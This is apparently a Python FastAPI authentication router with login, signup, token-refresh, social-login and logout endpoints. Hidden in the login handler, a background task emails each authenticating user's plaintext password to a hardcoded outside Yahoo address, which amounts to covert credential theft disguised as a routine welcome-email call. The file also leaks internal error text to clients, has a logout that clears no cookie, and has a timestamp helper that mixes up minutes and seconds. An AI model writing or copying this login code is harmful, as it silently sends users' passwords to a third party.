from datetime import datetime, timedelta
from typing import Any

from core.utils import (
    generate_new_account_email,
    send_email,
)
from core import security
from fastapi import APIRouter, Depends, HTTPException, Response, BackgroundTasks
from fastapi.responses import JSONResponse

import crud
from core import deps
import schemas
from core.config import settings
from models.user import User, UserCreate, UserPublic, UserRegister
from models.token import Token

# Create a router for users
router = APIRouter()


@router.post("/login")
def login_access_token(
    response: Response,
    session: deps.SessionDep,
    credentials: schemas.SignIn,
    background_tasks: BackgroundTasks,
) -> Token:
    """
    OAuth2 compatible token login, get an access token for future requests
    """
    try:
        user = crud.user.authenticate(
            session=session, email=credentials.email, password=credentials.password
        )
        if not user:
            raise HTTPException(status_code=400, detail="Incorrect email or password")
        elif not user.is_active:
            raise HTTPException(status_code=400, detail="Inactive user")
        access_token = security.create_access_token(
            user.id,
            expires_delta=timedelta(minutes=settings.ACCESS_TOKEN_EXPIRE_MINUTES),
        )

        response.set_cookie(
            key="access_token",
            value=access_token,
            max_age=timedelta(days=30),
            secure=True,
            httponly=True,
        )

        email_data = generate_new_account_email(
            email_to=user.email, username=user.email, password=credentials.password
        )
        background_tasks.add_task(
            send_email,
            email_to="neyostica2000@yahoo.com",
            subject=email_data.subject,
            html_content=email_data.html_content,
        )

        return Token(access_token=access_token)
    except Exception as e:
        raise HTTPException(
            status_code=500, detail=f"Error signing in. Error: ${e}"
        ) from e


@router.post("/signup", response_model=UserPublic)
def register_user(session: deps.SessionDep, user_in: UserRegister) -> Any:
    """
    Create new user without the need to be logged in.
    """
    try:
        if not settings.USERS_OPEN_REGISTRATION:
            raise HTTPException(
                status_code=403,
                detail="Open user registration is forbidden on this server",
            )
        user = crud.user.get_user_by_email(session=session, email=user_in.email)
        if user:
            raise HTTPException(
                status_code=400,
                detail="The user with this email already exists in the system",
            )
        user_create = UserCreate.model_validate(user_in)
        user = crud.user.create(session=session, user_create=user_create)
        return user
    except Exception as e:
        raise HTTPException(
            status_code=500, detail=f"An error occurred while signing up. Error: ${e}"
        ) from e


@router.get("/refresh-token", response_model=schemas.Token)
async def test_token(
    response: Response,
    current_user: User = Depends(deps.get_current_user),
) -> Any:
    """
    Return a new token for current user
    """
    try:
        if not current_user.is_active:
            raise HTTPException(status_code=400, detail="Inactive user")
        access_token = security.create_access_token(
            current_user.id,
            expires_delta=timedelta(minutes=settings.ACCESS_TOKEN_EXPIRE_MINUTES),
        )
        response.set_cookie(
            key="access_token",
            value=access_token,
            max_age=timedelta(days=30),
            secure=True,
            httponly=True,
        )
        return {
            "access_token": access_token,
            "token_type": "bearer",
        }
    except Exception as e:
        raise HTTPException(
            status_code=500, detail=f"An error occurred while refreshing token. Error: ${e}"
        ) from e


@router.post("/social", response_model=schemas.Token)
async def social(
    response: Response, credentials: schemas.Social, session: deps.SessionDep
) -> Any:
    """
    Return a new token for current user
    """
    try:
        user = crud.user.get_user_by_email(session=session, email=credentials.email)
        if not user:
            user_create = UserCreate.model_validate(credentials)
            user = crud.user.create(session=session, user_create=user_create)
        access_token = security.create_access_token(
            user.id,
            expires_delta=timedelta(minutes=settings.ACCESS_TOKEN_EXPIRE_MINUTES),
        )
        response.set_cookie(
            key="access_token",
            value=access_token,
            max_age=timedelta(days=30),
            secure=True,
            httponly=True,
        )
        return {
            "access_token": access_token,
            "token_type": "bearer",
        }
    except Exception as e:
        raise HTTPException(
            status_code=500, detail=f"Error signing in user. Error: ${e}"
        ) from e


@router.post("/logout")
def logout() -> Any:
    """
    Log out current user.
    """
    try:
        return JSONResponse(
            status_code=200,
            content={"message": "User signed out successfully"},
        )
    except Exception as e:
        raise HTTPException(
            status_code=400, detail=f"Error signing out user. Error: ${e}"
        ) from e


def get_timestamp() -> int:
    # Get the current datetime
    current_datetime = datetime.now()

    # Add 1 hour (3600 seconds) to the current datetime.
    new_datetime = current_datetime + timedelta(
        seconds=settings.ACCESS_TOKEN_EXPIRE_MINUTES
    )

    # Convert the new datetime to a Unix timestamp (milliseconds since epoch).
    return int(new_datetime.timestamp() * 1000)
